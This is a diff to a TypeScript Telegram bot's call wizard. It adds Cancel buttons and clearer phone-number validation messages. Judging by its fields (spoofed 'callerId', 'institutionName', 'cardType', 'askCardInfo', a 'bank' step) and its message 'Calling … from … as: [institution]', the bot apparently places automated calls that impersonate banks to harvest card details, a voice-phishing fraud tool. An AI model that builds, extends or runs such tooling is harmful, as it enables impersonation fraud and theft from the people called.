@@ -17,6 +17,7 @@ export const steps = (step: string): Array<Middleware<C>> => [
         /^./,
         step[0].toUpperCase(),
       )} ~</i></b>`,
+      Markup.inlineKeyboard([Markup.button.callback('❌ Cancel', 'cancel')]),
     );
     ctx.wizard.state.callData = {};
     return ctx.wizard.next();
@@ -72,6 +73,7 @@ export const steps = (step: string): Array<Middleware<C>> => [
         /^./,
         step[0].toUpperCase(),
       )} ~</i></b>`,
+      Markup.inlineKeyboard([Markup.button.callback('❌ Cancel', 'cancel')]),
     );
 
     // @ts-expect-error ts doesn't not recognise state
@@ -82,8 +84,8 @@ export const steps = (step: string): Array<Middleware<C>> => [
     ? [
         async (ctx: any) => {
           if (!validateNumber(ctx.message.text)) {
-            await ctx.reply(
-              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `,
+            await ctx.replyWithHTML(
+              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
             );
             return;
           }
@@ -94,6 +96,9 @@ export const steps = (step: string): Array<Middleware<C>> => [
               /^./,
               step[0].toUpperCase(),
             )} ~</i></b>`,
+            Markup.inlineKeyboard([
+              Markup.button.callback('❌ Cancel', 'cancel'),
+            ]),
           );
 
           ctx.wizard.state.callData.callerId = ctx.message.text;
@@ -105,8 +110,8 @@ export const steps = (step: string): Array<Middleware<C>> => [
     ? [
         async (ctx: any) => {
           if (!validateNumber(ctx.message.text)) {
-            await ctx.reply(
-              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `,
+            await ctx.replyWithHTML(
+              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
             );
             return;
           }
@@ -129,8 +134,8 @@ export const steps = (step: string): Array<Middleware<C>> => [
     ? [
         async (ctx: any) => {
           if (!validateNumber(ctx.message.text)) {
-            await ctx.reply(
-              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `,
+            await ctx.replyWithHTML(
+              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
             );
             return;
           }
@@ -168,15 +173,10 @@ export const steps = (step: string): Array<Middleware<C>> => [
       );
     }
     if (step === 'bank' && !ctx.wizard.state.callData.callerId) {
-      const numValid =
-        /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$|^(?:(?:\+?1\s*(?:[.-]\s*)?)?(?:\(\s*([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9])\s*\)|([2-9]1[02-9]|[2-9][02-8]1|[2-9][02-8][02-9]))\s*(?:[.-]\s*)?)?([2-9]1[02-9]|[2-9][02-9]1|[2-9][02-9]{2})\s*(?:[.-]\s*)?([0-9]{4})(?:\s*(?:#|x\.?|ext\.?|extension)\s*(\d+))?$/g.test(
-          // @ts-expect-error ts doesn't not recognise state
-          ctx.message.text,
-        );
-
-      if (!numValid) {
-        await ctx.reply(
-          `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\n  `,
+      // @ts-expect-error ts doesn't not recognise state
+      if (!validateNumber(ctx.message.text)) {
+        await ctx.replyWithHTML(
+          `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
         );
         return;
       }
@@ -190,12 +190,6 @@ export const steps = (step: string): Array<Middleware<C>> => [
         : undefined;
     const { number, institutionName, callerId, wallet, cardType, askCardInfo } =
       ctx.wizard.state.callData;
-    // const from =
-    //   /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
-    //     number,
-    //   )
-    //     ? process.env.UK_NUM
-    //     : process.env.US_NUM;
 
     await ctx.replyWithHTML(
       `Calling ${number}\nfrom ${callerId} as:\n\n${institutionName} 📲...\n\n<b><i>~ ${step.replace(
